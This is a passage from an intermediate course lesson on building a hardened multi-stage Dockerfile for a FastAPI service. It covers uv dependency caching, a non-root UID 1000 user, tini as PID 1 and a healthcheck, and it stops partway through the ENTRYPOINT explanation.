---
title: "Lesson 01: Docker Multi-Stage, Non-Root, Healthchecked"
aliases:
 - Dockerfile for FastAPI
 - Non-root container
 - Multi-stage build
 - Container hygiene
tags:
 - deployment
 - docker
 - security
 - containers
 - lesson
course_level: intermediate
status: complete
difficulty: intermediate
estimated_time: "75–100 minutes"
prerequisites:
 - "[[01-Python-Foundations/uv-Tooling-Workflows]]"
 - "[[04-Pydantic/Pydantic-Settings]]"
 - "[[02-Web-and-HTTP/ASGI-Starlette-Uvicorn]]"
 - "[[03-FastAPI-Core/Application-and-Lifespan]]"
related_lessons:
 - "[[Docker-Compose-Local-Dev]]"
 - "[[GitHub-Actions-CI]]"
 - "[[Migration-Ordering-and-Rollback]]"
---

# Lesson 01: Docker Multi-Stage, Non-Root, Healthchecked

*Building the production `Dockerfile` for `Boardly` — a two-stage build with `uv 0.13.1`, a virtualenv that survives the stage cut, a UID 1000 that survives a container escape, and a `HEALTHCHECK` that survives a flapping database.*

**You're at the very beginning of Section 16.**

Every FastAPI service you'll ever ship to a cluster — the tiny side project on Fly.io, the production system on ECS, the open-source library on a single VM — was once exactly where you are now: staring at a `Dockerfile` and wondering why a "Python image" is 1.2 GB, why it runs as `root`, and why it ignores `Ctrl+C`. Take your time. Type every line. Build the image. Inspect it. **This is how you learn.**


#docker #deployment #security #containers

## Learning Objectives

By the end of this lesson you will be able to:

1. **Write a two-stage `Dockerfile`** where the builder stage has the C toolchain and `uv`, and the runtime stage has only the virtualenv and the app source.
2. **Install dependencies with `uv 0.13.1`** into an explicit virtualenv at `/app/.venv`, copied from builder to runtime as a single tree.
3. **Order layers for cache efficiency** — copy `pyproject.toml` and `uv.lock` *before* the source so a one-line code change rebuilds only the last layer.
4. **Justify `USER 1000`, `HEALTHCHECK`, `ENTRYPOINT` and the exec-form `CMD`** in a production image.
5. **Explain why `tini` is PID 1** and what goes wrong (zombie children, lost `SIGTERM`) when it is not.
6. **Distinguish `/healthz` (liveness) from `/readyz` (readiness)** and explain why the `HEALTHCHECK` hits the first, not the second.
7. **Inspect a built image** with `docker image inspect` and verify the user, the entrypoint, the env, and the absence of `pip`/`uv`/`gcc` in the runtime.
8. **Recognise the seven classic Dockerfile mistakes** — `COPY . /app` before deps, leaving `uv` in the runtime, defaulting to `root`, healthcheck that touches the DB, `curl`-based healthcheck, string-form `CMD`, and `:latest` as the only tag.

## Prerequisites

Before starting, you need:

- **Docker** (latest stable, October 2026) installed and `docker run hello-world` working on your machine. We use multi-stage builds, `COPY --from=...`, and `HEALTHCHECK`; all stable since Docker 17.05.
- **The `uv` lesson** — [[01-Python-Foundations/uv-Tooling-Workflows]]. You should already know `uv sync`, `uv run`, and what `uv.lock` is. We use `uv 0.13.1` specifically — the verified October 2026 version.
- **The Pydantic Settings lesson** — [[04-Pydantic/Pydantic-Settings]]. Config flows through a `BaseSettings` instance with `env_prefix="APP_"`.
- **The ASGI lesson** — [[02-Web-and-HTTP/ASGI-Starlette-Uvicorn]]. The container runs `uvicorn` under `tini`; you should know what Uvicorn does and what `(scope, receive, send)` means.
- **The lifespan lesson** — [[03-FastAPI-Core/Application-and-Lifespan]]. The `HEALTHCHECK` depends on lifespan startup completing.

## The Problem

A container image is the deployable artifact you ship to production. The image you build locally and the image the cluster runs should be **identical**, byte-for-byte, so that the only thing that varies between environments is injected configuration. Three properties turn "a Python image" into "a production image":

1. **It should be small.** The runtime image should not contain the C toolchain, the `pip`/`uv` package managers, or the build-time headers. Each megabyte is a megabyte pulled on every deploy across every replica.
2. **It should not run as `root`.** A container that runs as `root` (UID 0) hands the host kernel a root shell if there is ever a container-escape vulnerability in the runtime, a mounted socket, or a misconfigured volume. Most orchestrators refuse to schedule images flagged as running-as-root when `podSecurityContext` is enforced.
3. **It should tell the platform when it is healthy.** A `HEALTHCHECK` is a command Docker (and any orchestrator that reads its conventions) runs periodically. The container is marked `healthy` when the command exits `0`, `unhealthy` on non-zero. A reverse proxy or orchestrator routes traffic only to healthy containers. Without a healthcheck, a broken container keeps receiving traffic until a human notices.

A naive Dockerfile gets exactly zero of these right:

```dockerfile
# NAIVE — do not ship this
FROM python:3.12
COPY . /app
WORKDIR /app
RUN pip install -r requirements.txt
CMD ["uvicorn", "boardly.main:app"]
```

This image is 1.2 GB. It runs as `root`. It has no healthcheck. It rebuilds every layer on every code change. It does not handle `SIGTERM` properly because `uvicorn` is PID 1 and PID 1 in a container does not get the default signal handlers. We are going to fix all four problems with one Dockerfile.

**Tip — Think like a senior systems architect: the container is a security boundary, not a packaging convenience.**

Don't think of Docker as "a way to package code so it runs the same on my laptop and in production." That framing is true but it is the *junior* view. The senior view is: a container is a **security boundary** that runs with a specific UID (we picked 1000), with a specific subset of Linux capabilities (Docker's default `seccomp` profile blocks ~44 of the ~300 Linux syscalls; `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_SYS_PTRACE` are not granted by default), with a specific filesystem view (a writable overlay on top of read-only image layers, with `/proc` and `/sys` mounted `nosuid`, `nodev`, and on most runtimes `noexec`), and with a specific network namespace (the container's `eth0` is a `veth` pair bridged to the host's `docker0` or to the Kubernetes pod network). The senior engineer's question is always: "if an attacker gets RCE inside this container, what can they reach?" The honest answer walks the threat model: they can read `/app/boardly` (read-only to UID 1000, so they can read your source — keep secrets out of the image); they can write to `/tmp` and the writable layer (ephemeral, gone on container death); they can reach the network the container is attached to (can they reach the database? Redis? the LLM provider's API? the cloud metadata service at `169.254.169.254` if you're on a cloud and haven't restricted egress?); they cannot escalate to root on the host unless there is a kernel CVE or a configuration hole (the `seccomp` filter, `userns-remap`, and the absence of `--privileged` are your backstops). If the answer is "the host filesystem" (because you bind-mounted `/var/run/docker.sock` for "convenience"), or "other containers" (because you put them on the same bridge with no network policy), or "the cloud metadata service" (because you didn't restrict egress with an `Egress` NetworkPolicy or a security-group rule) — your boundary is too wide. The Dockerfile is the moment you decide how wide that boundary is, and `USER 1000` plus a stripped runtime (no `uv`, no `pip`, no `gcc`, no `curl`) plus an orchestrator-enforced `runAsNonRoot: true` are the three levers you have. Pulling them is not optional in production.


## The Code

Here is the complete `Dockerfile` for `Boardly`. Read it through once; we will go line by line afterwards.

```dockerfile
# syntax=docker/dockerfile:1.7
ARG PYTHON_VERSION=3.12.7
ARG UV_VERSION=0.13.1

############################
# 1. Builder stage
############################
FROM python:${PYTHON_VERSION}-slim AS builder

# uv is distributed as a static binary; copy it from the official image.
# Pin the version, do not pull :latest.
COPY --from=ghcr.io/astral-sh/uv:${UV_VERSION} /uv /usr/local/bin/uv

# Build dependencies for packages that compile C extensions (psycopg, etc.).
# These never reach the runtime image.
RUN apt-get update \
 && apt-get install --no-install-recommends -y \
 build-essential libpq-dev curl \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Disable uv from auto-downloading a different Python; use the image's Python.
ENV UV_PYTHON_PREFERENCE=only-system \
 UV_PROJECT_ENVIRONMENT=/app/.venv \
 UV_LINK_MODE=copy

# Install dependencies FIRST so this layer caches across source changes.
COPY pyproject.toml uv.lock ./
RUN uv sync --frozen --no-dev --no-install-project

# Now copy the source and install the project itself (cheap; reuses cached deps).
COPY ./boardly ./boardly
COPY ./README.md ./README.md
RUN uv sync --frozen --no-dev

############################
# 2. Runtime stage
############################
FROM python:${PYTHON_VERSION}-slim AS runtime

# Runtime libs only. No compilers, no -dev headers, no uv, no pip.
RUN apt-get update \
 && apt-get install --no-install-recommends -y \
 libpq5 ca-certificates tini \
 && rm -rf /var/lib/apt/lists/* \
 && groupadd --system --gid 1000 app \
 && useradd --system --uid 1000 --gid app --home-dir /app --shell /sbin/nologin app

WORKDIR /app

# Copy the virtualenv from the builder. This is the only artifact we carry over.
COPY --from=builder --chown=app:app /app/.venv /app/.venv
COPY --chown=app:app ./boardly ./boardly

# Put the venv first on PATH so `python`, `uvicorn` resolve to the venv's binaries.
ENV PATH="/app/.venv/bin:${PATH}" \
 PYTHONDONTWRITEBYTECODE=1 \
 PYTHONUNBUFFERED=1 \
 UV_PROJECT_ENVIRONMENT=/app/.venv

USER 1000

# tini reaps zombie processes when uvicorn forks workers; it is PID 1.
ENTRYPOINT ["/usr/bin/tini", "--"]

# Use the array form so the shell does not eat signals. Exec form means
# uvicorn becomes PID 1's child and receives SIGTERM directly.
CMD ["uvicorn", "boardly.main:app", "--host", "0.0.0.0", "--port", "8000"]

EXPOSE 8000

# Healthcheck: hit /healthz every 30s. Three consecutive failures => unhealthy.
HEALTHCHECK --interval=30s --timeout=5s --start-period=15s --retries=3 \
 CMD python -c "import urllib.request, sys; sys.exit(0 if urllib.request.urlopen('http://127.0.0.1:8000/healthz', timeout=3).status==200 else 1)"
```

And the matching app, with `/healthz` and `/readyz`:

```python
# boardly/main.py
from typing import Annotated
from fastapi import Depends, FastAPI
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncSession

from boardly.config import settings
from boardly.deps import get_session

app = FastAPI(title=settings.app_name, version="0.1.0")


@app.get("/healthz")
def healthz() -> dict[str, str]:
 # Liveness: process is up and serving. Never touch the DB here.
 return {"status": "ok"}


@app.get("/readyz")
async def readyz(session: Annotated[AsyncSession, Depends(get_session)]) -> dict[str, str]:
 # Readiness: process can serve real traffic. Touching the DB is fine here.
 await session.execute(text("SELECT 1"))
 return {"status": "ready"}
```

And the settings module that the container reads its env vars through:

```python
# boardly/config.py
from pydantic_settings import BaseSettings, SettingsConfigDict


class Settings(BaseSettings):
 model_config = SettingsConfigDict(env_prefix="APP_", env_file=".env")

 app_name: str = "boardly"
 database_url: str = "postgresql+asyncpg://boardly:__REDACTED__@postgres:5432/boardly"
 redis_url: str = "redis://redis:6379/0"
 log_level: str = "INFO"


settings = Settings()
```

## Line-by-Line Deep Dive

### Lines 1–3: The `syntax` directive and the `ARG`s

```dockerfile
# syntax=docker/dockerfile:1.7
ARG PYTHON_VERSION=3.12.7
ARG UV_VERSION=0.13.1
```

**What it does:** The `# syntax=...` comment is not a comment — it is a parser directive. It tells Docker to use BuildKit's `dockerfile-1.7` frontend, which supports `--mount=type=cache`, `--link`, and other modern features. The two `ARG`s declare build-time variables with default values; they are visible to every stage.

**Why this matters:**

- The `syntax` directive is what unlocks `RUN --mount=type=cache,target=/root/.cache/uv` later if you want even better caching. Without it, BuildKit uses the legacy frontend that does not understand `--mount`.
- `ARG`s at the top of the file (before any `FROM`) are *global*; they can be reused by every stage. `ARG`s inside a stage are local to that stage.
- `UV_VERSION=0.13.1` is the verified October 2026 version. The full version pin and digest resolution should be handled by CI in a real registry; the `ARG UV_VERSION` here lets you bump it in one place.

**Why pin `PYTHON_VERSION` instead of hardcoding `python:3.12-slim` everywhere?**

A single `ARG` lets you bump Python in one place when 3.13 becomes the canonical version. Real registries also pin the *digest* (`python:3.12-slim@sha256:...`) so that the base image cannot silently change when Python publishes a new patch. We omit digests here for readability; in production, the CI pipeline (Lesson 3) should resolve the digest and write it into a lockfile.


**Tip — Maintainability thinking: the Dockerfile is documentation, not code.**

The senior engineer's rule: the Dockerfile is read 10× more than it is written (every deploy, every oncall incident, every new engineer's first day, every security audit, every CVE investigation). Optimize for the reader, not the writer. This means: (a) **the `ARG`s at the top are the contract** — `PYTHON_VERSION`, `UV_VERSION` are the *only* version-pinning surface; bumping Python is one line, not a grep across 14 `FROM`s; (b) **comments explain *why*, not *what*** — `# uv is distributed as a static binary; copy it from the official image.` is a *why* (a reader who doesn't know uv asks "why not `pip install uv`?" and the comment answers); `# Install dependencies` would be a *what* (the line below already says that); (c) **the build order *is* the cache order** — moving the source `COPY` before the deps `RUN` would not break the build, but it would silently make every rebuild 90 seconds slower, and the next engineer would not know why; the Dockerfile's *structure* is the explanation, and the comment `# Install dependencies FIRST so this layer caches across source changes.` makes the invariant explicit; (d) **the `HEALTHCHECK` command is the runbook** — when it fails, the operator's first question is "what does `/healthz` check?" and the answer is in the Dockerfile, one `grep` away; (e) **every line that adds size must justify its size** — `tini` (~200 KB) is justified because PID-1 signal-handling is a real problem; `curl` (5 MB) is not justified because `python -c "import urllib.request"` is free. The most important line of code in a Dockerfile is the line you *don't* add — every package, every `COPY`, every `RUN` is a maintenance burden and a CVE surface for the lifetime of the image. If you can solve the problem with configuration (e.g. `ENV PYTHONDONTWRITEBYTECODE=1` instead of a `RUN` that deletes `.pyc` files), do it.


### Lines 5–9: The builder `FROM` and the `uv` copy

```dockerfile
############################
# 1. Builder stage
############################
FROM python:${PYTHON_VERSION}-slim AS builder

# uv is distributed as a static binary; copy it from the official image.
# Pin the version, do not pull :latest.
COPY --from=ghcr.io/astral-sh/uv:${UV_VERSION} /uv /usr/local/bin/uv
```

**What it does:** Starts the **builder stage** from `python:3.12.7-slim` and names it `builder` so the runtime stage can `COPY --from=builder`. Then copies the `uv` binary from the official Astral image into `/usr/local/bin/uv`.

**Why this matters:**

- `AS builder` is the *named stage* syntax. Multi-stage builds use this so later stages can reference earlier ones with `COPY --from=builder`. Without a name, you would have to `COPY --from=0`, which is brittle if you add a stage.
- `python:3.12-slim` is the slim variant of the official Python image — about 50 MB. It is glibc-based (unlike `alpine`, which is musl-based), so binary wheels from PyPI work without a C toolchain in the runtime.
- `COPY --from=ghcr.io/astral-sh/uv:0.13.1 /uv /usr/local/bin/uv` is the Astral-recommended install path. The `uv` binary in the `ghcr.io/astral-sh/uv` image is a single static binary; copying it in is one layer. The alternative — `pip install uv` — pulls a Python wheel into the builder and adds the wheel's own dependencies.
- **Pinning the tag** (`:0.13.1`, not `:latest`) means the build is reproducible. `:latest` floats and could break your build when Astral ships a new major version.

**Tip — `COPY --from=<external-image>` is multi-stage cross-pollination.**

The `COPY --from=...` syntax can name an earlier stage (`COPY --from=builder ...`) OR a completely separate image (`COPY --from=ghcr.io/astral-sh/uv:0.13.1 ...`). The latter does not require you to declare a stage for `uv` — Docker pulls the image just-in-time during the build. This is how you pull static binaries from official images without bloating your own.


### Lines 11–15: The build-time apt packages

```dockerfile
# Build dependencies for packages that compile C extensions (psycopg, etc.).
# These never reach the runtime image.
RUN apt-get update \
 && apt-get install --no-install-recommends -y \
 build-essential libpq-dev curl \
 && rm -rf /var/lib/apt/lists/*
```

**What it does:** Installs `build-essential` (gcc, g++, make), `libpq-dev` (the PostgreSQL client headers), and `curl`, then removes the apt package lists to keep the layer small.

**Why these packages:**

- `build-essential` — packages like `psycopg` (the v3 PostgreSQL driver) ship as source wheels for some platforms; without gcc, `pip`/`uv` cannot compile them.
- `libpq-dev` — `psycopg` links against `libpq`; the headers are needed at build time. Note: at *runtime* we will install `libpq5` (the shared library), not `libpq-dev` (the headers). The headers are build-only.
- `curl` — useful in the builder for any health checks or download scripts. Not needed in the runtime.
- `--no-install-recommends` — Debian's "recommends" pull in dozens of packages we do not need. Disabling them is a real space win.
- `rm -rf /var/lib/apt/lists/*` — the apt package lists are downloaded by `apt-get update`; they are not needed after install, and they bloat the layer. Removing them in the same `RUN` keeps the layer small (each `RUN` is a layer; if you removed the lists in a separate `RUN`, the first layer would still contain them).

**Why `\` at the end of every line?**

The backslash is line continuation in shell. A single `RUN` with `\` continuations is one shell command, which is one layer. Splitting it into multiple `RUN`s would be multiple layers, each containing the previous state plus the new files — and the layer count matters because Docker pulls layers in parallel and caches them independently.


### Lines 17–22: `WORKDIR` and the `uv` env vars

```dockerfile
WORKDIR /app

# Disable uv from auto-downloading a different Python; use the image's Python.
ENV UV_PYTHON_PREFERENCE=only-system \
 UV_PROJECT_ENVIRONMENT=/app/.venv \
 UV_LINK_MODE=copy
```

**What it does:** Sets the working directory to `/app` (creating it if it does not exist), and sets three `uv`-specific environment variables.

**Why these env vars:**

- `UV_PYTHON_PREFERENCE=only-system` — `uv` will *only* use the Python interpreter already installed in the image (the one from `python:3.12-slim`). Without this, `uv` might decide to download its own managed Python and use that instead, which would diverge from the image's interpreter and could cause subtle ABI mismatches with C extensions.
- `UV_PROJECT_ENVIRONMENT=/app/.venv` — pins the virtualenv path. `uv sync` will install into `/app/.venv`, not into some `uv`-default location. This is what lets us `COPY --from=builder /app/.venv /app/.venv` later.
- `UV_LINK_MODE=copy` — by default `uv` hardlinks files from its cache into the venv, which is fast but breaks across filesystems (the cache and the venv must be on the same device). `copy` is portable; the cost is a few extra seconds on first install.

**Note — `ENV` vs `ARG`**

`ARG UV_VERSION=0.13.1` is a *build-time* variable; it is gone after the build. `ENV UV_PROJECT_ENVIRONMENT=/app/.venv` is an *environment variable* baked into the image; it is set in every container started from this image. Use `ARG` for things the build needs but the runtime does not (build tool versions); use `ENV` for things the runtime needs (the venv path).


### Lines 24–26: The dependency layer

```dockerfile
# Install dependencies FIRST so this layer caches across source changes.
COPY pyproject.toml uv.lock ./
RUN uv sync --frozen --no-dev --no-install-project
```

**What it does:** Copies only `pyproject.toml` and `uv.lock` into the builder, then runs `uv sync --frozen --no-dev --no-install-project` to install *all dependencies* but *not the project itself* into `/app/.venv`.

**Why this matters:**

- **This is the cache-secret of multi-stage Python builds.** Docker caches each layer by the inputs that produced it. The input to this layer is `pyproject.toml` and `uv.lock`. If you change a line of `boardly/main.py`, the inputs to this layer are unchanged, so the layer is reused as-is. Only the *next* `COPY` (the source) is invalidated.
- If you had done `COPY . /app` *first* and then `RUN uv sync`, every code change would invalidate the `uv sync` layer, and you would re-resolve the whole dependency tree on every build. That is minutes of wasted time per build.
- `--frozen` — refuses to update `uv.lock` even if `pyproject.toml` changed. This is the CI-grade guarantee: if `pyproject.toml` and `uv.lock` disagree, the build fails. You can never accidentally ship an image whose lockfile does not match its `pyproject.toml`.
- `--no-dev` — skip the `dev` and `test` optional dependency groups. The production image does not need `ruff`, `mypy`, or `pytest`.
- `--no-install-project` — install only the *dependencies*, not the project itself. The project itself is installed in the next `RUN` after the source is copied, because the project's package is part of the source tree.

**Tip — Why two `uv sync` calls?**

The first `uv sync --frozen --no-dev --no-install-project` populates the venv with all third-party deps, cached on the lockfile. The second `uv sync --frozen --no-dev` (after the source `COPY`) installs the project itself — `pip install -e .` in effect. The second is cheap because the deps are already there; it only adds the project package, which is a few kilobytes. Splitting them lets the deps layer cache independently of the source layer.


**Warning — When this breaks: `uv sync --frozen` fails in CI with `error: the lockfile needs to be updated but --frozen was passed`.**

The build worked on the developer's laptop (where `uv sync` was allowed to silently rewrite `uv.lock` to match `pyproject.toml`), but the moment CI ran `uv sync --frozen`, the build failed because the committed `uv.lock` and the edited `pyproject.toml` had drifted. The fix is not to remove `--frozen` — that flag is the entire CI-grade guarantee that the image's deps are reproducible. The fix is upstream: a `pre-commit` hook that runs `uv lock --check` (exits non-zero if `uv.lock` does not match `pyproject.toml`) on every commit, plus a CI pre-job that runs `uv lock --check` before `docker build` so the failure surfaces as a fast, named check, not as a 90-second build that fails at the deps layer. Verify with `uv run --frozen uv lock --check` locally before pushing — the command should exit 0; if it exits non-zero, run `uv lock` and commit the updated `uv.lock`. The [[01-Python-Foundations/uv-Tooling-Workflows]] + [[12-Testing-and-Quality/CI-Pipelines]] forward refs cover the lockfile-discipline story.


### Lines 28–30: The source copy and project install

```dockerfile
# Now copy the source and install the project itself (cheap; reuses cached deps).
COPY ./boardly ./boardly
COPY ./README.md ./README.md
RUN uv sync --frozen --no-dev
```

**What it does:** Copies the `boardly` package directory and `README.md` (often required by `setuptools` for the long description) into the builder, then re-runs `uv sync --frozen --no-dev` — this time *with* the project install.

**Why this matters:**

- `COPY ./boardly ./boardly` — only the package directory. If you have a `tests/` directory, it does not belong in the production image. Use a `.dockerignore` file (we will see it in Lesson 3) to exclude `tests/`, `.git`, `.venv`, `__pycache__`, `*.pyc`, etc.
- The second `uv sync` is the one that installs `boardly` itself into `/app/.venv`. Because the deps are already there, this is fast — typically under a second.
- After this `RUN`, the builder's `/app/.venv` contains the entire runtime: `uvicorn`, `fastapi`, `sqlalchemy`, `psycopg`, `redis`, and `boardly`. That is the artifact we will copy to the runtime stage.

### Lines 32–39: The runtime stage starts

```dockerfile
############################
# 2. Runtime stage
############################
FROM python:${PYTHON_VERSION}-slim AS runtime

# Runtime libs only. No compilers, no -dev headers, no uv, no pip.
RUN apt-get update \
 && apt-get install --no-install-recommends -y \
 libpq5 ca-certificates tini \
 && rm -rf /var/lib/apt/lists/* \
 && groupadd --system --gid 1000 app \
 && useradd --system --uid 1000 --gid app --home-dir /app --shell /sbin/nologin app
```

**What it does:** Starts a *fresh* `python:3.12-slim` for the runtime, installs the *runtime-only* apt packages, removes the apt lists, and creates a non-root user `app` with UID 1000.

**Why this is the heart of "multi-stage":**

- The runtime stage does not inherit *anything* from the builder. It is a fresh base. The C toolchain, `libpq-dev`, `curl`, `uv` — none of them are here. The only thing we will bring over is the `/app/.venv` tree (next `COPY`) and the source.
- `libpq5` — the *shared library* that `psycopg` (the v3 driver) dynamically loads at runtime. Not the headers (`libpq-dev`); those were build-only.
- `ca-certificates` — needed for any TLS connection (HTTPS to an external API, `postgresql+asyncpg://...?sslmode=require`). The slim image does not include the system CA bundle by default.
- `tini` — the PID 1 init. We will set it as the `ENTRYPOINT`.
- `groupadd --system --gid 1000 app` and `useradd --system --uid 1000 --gid app --home-dir /app --shell /sbin/nologin app` — creates a non-login user `app` with UID 1000. `--system` means it gets a UID in the system range (typically 100-999) on Debian, but we explicitly set `--uid 1000`. UID 1000 is a convention; some orchestrators (Kubernetes with `runAsNonRoot: true` and no `runAsUser`) require the UID to be non-zero but do not care which one. We pick 1000 because it is the default first human UID on most Linuxes, so it is unlikely to clash with a system UID.

**Danger — Why non-root matters even inside a container.**

Containers are not virtual machines. The kernel is shared with the host. A container-escape vulnerability in the kernel, in `runc`, or in a mounted Docker socket (`/var/run/docker.sock`) lands the attacker on the host with the UID the container was running as. If that UID is 0 (root), they own the host. If it is 1000, they own only what `app` owns — which is just the `/app` directory and nothing else. The reduction in blast radius is enormous. **Never run a production container as root.**

The other half of the rule: the orchestrator must also enforce this. In Kubernetes, set `securityContext.runAsNonRoot: true` and `runAsUser: 1000` on the pod spec. Without `runAsNonRoot: true`, the kubelet will happily run an image whose `Dockerfile` says `USER 0` even if you forgot to override it. Belt and braces.


### Lines 41–43: `WORKDIR` and the artifact copy

```dockerfile
WORKDIR /app

# Copy the virtualenv from the builder. This is the only artifact we carry over.
COPY --from=builder --chown=app:app /app/.venv /app/.venv
COPY --chown=app:app ./boardly ./boardly
```

**What it does:** Sets the working directory to `/app`, copies the virtualenv from the builder into `/app/.venv` (owned by `app:app`), and copies the source directory into `/app/boardly` (also owned by `app:app`).

**Why this matters:**

- `COPY --from=builder` is the multi-stage magic. It reaches into the builder stage's filesystem and copies a tree — without inheriting any of the builder's layers, base image, or apt packages. The result is a runtime image that has `python:3.12-slim` + `libpq5` + `tini` + `/app/.venv` + `/app/boardly` and *nothing else*.
- `--chown=app:app` — the venv is owned by `app`, not by `root`. Without `--chown`, the files would be owned by root and the `app` user could not read or execute them (well, they would have world-read by default, but it is cleaner to set ownership explicitly).
- Why copy the source *again* in the runtime stage (we already copied it into the builder)? Because the builder's filesystem is discarded; only what we explicitly `COPY --from=builder` survives. The source itself is small (a few hundred KB), so the duplicate copy is cheap.

**The virtualenv is portable across stages — but only if the Python interpreter matches.**

A virtualenv is not a magical self-contained Python; it is a directory with symlinks (or copies) to a specific Python interpreter's standard library plus a `site-packages` directory. The venv built in the builder (`python:3.12-slim`) is *portable* to the runtime (`python:3.12-slim`) because both stages use the *same* base image and the same Python interpreter at the same path. If the runtime stage used `python:3.13-slim`, the venv's symlinks to `/usr/local/bin/python3.12` would be broken. **Keep the same `PYTHON_VERSION` in both stages.**


**Production reality: the venv is portable across stages — until the base image's digest is republished mid-CI.**

The lesson says "keep the same `PYTHON_VERSION` in both stages." That is necessary but not sufficient. The `python:3.12.7-slim` tag is mutable — Docker Hub republishes it when a CVE patch lands. If your build pulls the old digest for the builder and a new digest for the runtime (because the tag moved between the two `FROM python:${PYTHON_VERSION}-slim` lines), the runtime's `/usr/local/lib/python3.12/encodings` may have a different inode layout than the builder's, and the venv's `pyvenv.cfg` points at a stdlib path that does not exist. Symptom at first boot: `ModuleNotFoundError: No module named 'encodings'` (the interpreter cannot bootstrap). Defence in depth: (a) pin the digest, not just the tag — `ARG PYTHON_IMAGE=python:3.12.7-slim@sha256:abc...` and `FROM ${PYTHON_IMAGE}` in both stages so the same digest is reused; (b) Renovate or Dependabot opens PRs to bump the digest when a CVE patch lands; (c) the CI smoke test runs `docker run --rm IMAGE python -c 'import encodings, fastapi, sqlalchemy, psycopg'` and exits non-zero before the image is tagged deployable. Verify with `docker image inspect python:3.12.7-slim --format '{{.RepoDigests}}'` — the digest is reproducible across pulls only if the tag has not been republished. The [[16-Deployment-and-DevOps/GitHub-Actions-CI]] + [[03-FastAPI-Core/Application-and-Lifespan]] forward refs cover the smoke-test and startup-contract story.


### Lines 45–49: `PATH` and Python runtime env

```dockerfile
# Put the venv first on PATH so `python`, `uvicorn` resolve to the venv's binaries.
ENV PATH="/app/.venv/bin:${PATH}" \
 PYTHONDONTWRITEBYTECODE=1 \
 PYTHONUNBUFFERED=1 \
 UV_PROJECT_ENVIRONMENT=/app/.venv
```

**What it does:** Prepends `/app/.venv/bin` to `PATH`, sets two Python runtime env vars, and re-sets `UV_PROJECT_ENVIRONMENT` (the value from the builder does not carry over because it is a per-stage `ENV`).

**Why these env vars:**

- `PATH="/app/.venv/bin:${PATH}"` — when the container runs `uvicorn ...`, the shell looks up `uvicorn` on `PATH`. `/app/.venv/bin/uvicorn` exists (it was installed by `uv sync`); the system `uvicorn` does not. Putting the venv first means the right binary is found.
- `PYTHONDONTWRITEBYTECODE=1` — Python will not write `.pyc` files. In a container, the bytecode cache provides no benefit (the process is short-lived and the `.pyc` files would just bloat the image's writable layer at runtime).
- `PYTHONUNBUFFERED=1` — `stdout` and `stderr` are not buffered. Without this, your `print()` statements and your log lines sit in a buffer until the buffer fills, and the orchestrator's logs show nothing for seconds at a time. With this, every line is flushed immediately. **This is critical for log visibility in production.**
- `UV_PROJECT_ENVIRONMENT=/app/.venv` — if anyone runs `uv` inside the runtime (they should not, but if they do), it will operate on the right venv.

### Line 51: `USER 1000`

```dockerfile
USER 1000
```

**What it does:** All subsequent commands (`RUN`, `CMD`, `ENTRYPOINT`) and the container's main process run as UID 1000 instead of root.

**Why this matters:**

- After this line, the container's process (`tini`, then `uvicorn`) runs as `app` (UID 1000). If an attacker exploits a vulnerability in `uvicorn` or in a route handler and escapes to the host, they land as UID 1000 on the host — not as root.
- Note the ordering: `USER 1000` comes *after* the `COPY --chown=app:app` lines. If it came before, the `COPY` would still work (it runs as root during build), but it is clearer to do the privilege drop last so every `RUN` after it is also unprivileged. We have no `RUN` after `USER 1000` in this Dockerfile, but if we added one (say, `RUN python -c "import boardly"`), it would run as `app`.

**Warning — The order of `USER` matters more than people think.**

If you `USER app` *before* a `RUN` that needs root (e.g. `RUN apt-get install ...`), the `RUN` fails. The pattern is: do all root work first, drop privileges last. In this Dockerfile, the apt install + user creation is in lines 35-43 (root), the `COPY` is in lines 42-43 (root, with `--chown`), and `USER 1000` is in line 51 — the very last `RUN`/`ENV`/`USER` directive before the `ENTRYPOINT`.


**Warning — When this breaks: pods `CrashLoopBackOff` with `PermissionError: [Errno 13] Permission denied: '/app/boardly/__pycache__/main.cpython-312.pyc'` at 3 a.m.**

The deploy rolled out clean in staging — but staging runs `--reload` with the source bind-mounted, so bytecode is written to the host. Prod mounts nothing, so the container's `uvicorn` process tries to write `.pyc` files into `/app/boardly/__pycache__/`. The directory was created by `COPY --chown=app:app ./boardly ./boardly` during build — and the build-time `COPY` runs as root with a umask of 022, so the directory's mode is `0755`. The `app` user (UID 1000) is the owner, so it CAN write — unless a previous `RUN python -c "import boardly"` AFTER `USER 1000` wrote root-owned `.pyc` files into `/app/boardly/__pycache__/` because `PYTHONDONTWRITEBYTECODE=1` was set in the runtime stage's `ENV` but not yet effective when the smoke `RUN` lived (the smoke wrote bytecode as root, the follow-on `COPY --chown=app:app ./boardly` re-chowned the source tree but NOT the `.pyc` files written AFTER the first COPY). Debugging path: `docker run --rm --entrypoint sh boardly:$(git rev-parse --short HEAD) -c 'find /app -name "*.pyc" -exec ls -l {} \;'` shows root-owned `.pyc` files inside the `app`-owned dir; `docker run --rm --entrypoint sh boardly:$(git rev-parse --short HEAD) -c 'ls -la /app/boardly/__pycache__/'` shows the owner mismatch. Fix: (a) set `ENV PYTHONDONTWRITEBYTECODE=1` in the BUILDER stage too, before any `RUN python`; (b) add `boardly/__pycache__/` to `.dockerignore` so stale bytecode never enters the build context; (c) the import-smoke belongs in the runtime `CMD` (`CMD ["python", "-c", "import boardly; import fastapi; import sqlalchemy"]` for the smoke image, `CMD ["uvicorn", ...]` for the prod image), not in a build-time `RUN` after `USER 1000`. Verify with `docker run --rm --entrypoint sh boardly:$(git rev-parse --short HEAD) -c 'find /app -name "*.pyc" | wc -l'` — expect `0`. The [[13-Performance-and-Observability/Structured-Logging-and-Request-IDs]] + [[03-FastAPI-Core/Application-and-Lifespan]] forward refs cover the runbook-and-startup-contract story.


### Lines 53–57: `ENTRYPOINT` and `CMD`

```dockerfile
# tini reaps zombie processes when uvicorn forks workers; it is PID 1.
ENTRYPOINT ["/usr/bin/tini", "--"]

# Use the array form so the shell does not eat signals. Exec form means
# uvicorn becomes PID 1's child and receives SIGTERM directly.
CMD ["uvicorn", "boardly.main:app", "--host", "0.0.0.0", "--port", "8000"]
```

**What it does:** Sets `tini` as the entrypoint (PID 1) and `uvicorn ...` as the command. The container's effective process is `/usr/bin/tini -- uvicorn boardly.main:app --host 0.0.0.0 --port 8000`.

**Why `tini`:**

